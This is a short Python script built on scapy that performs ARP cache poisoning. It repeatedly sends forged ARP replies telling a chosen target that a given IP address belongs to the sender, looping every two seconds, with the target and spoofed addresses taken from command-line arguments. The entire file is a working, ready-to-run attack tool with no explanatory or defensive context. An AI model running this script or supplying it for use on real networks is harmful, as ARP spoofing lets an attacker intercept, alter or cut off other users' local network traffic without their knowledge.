import argparse
from scapy.all import *
import time

def spoof(target_address: str, spoof_address: str):
 
    arp_poison_ping = ARP(op=2,pdst=target_address,psrc=spoof_address)

    print(f"Spoofing {target_address} as {spoof_address}")
    while True:
        send(arp_poison_ping,verbose=False)
        time.sleep(2)


parser = argparse.ArgumentParser()
parser.add_argument("--target_address",type=str)
parser.add_argument("--spoof_address",type=str)
args = parser.parse_args()

target_address = args.target_address
spoof_address = args.spoof_address

spoof(target_address,spoof_address)
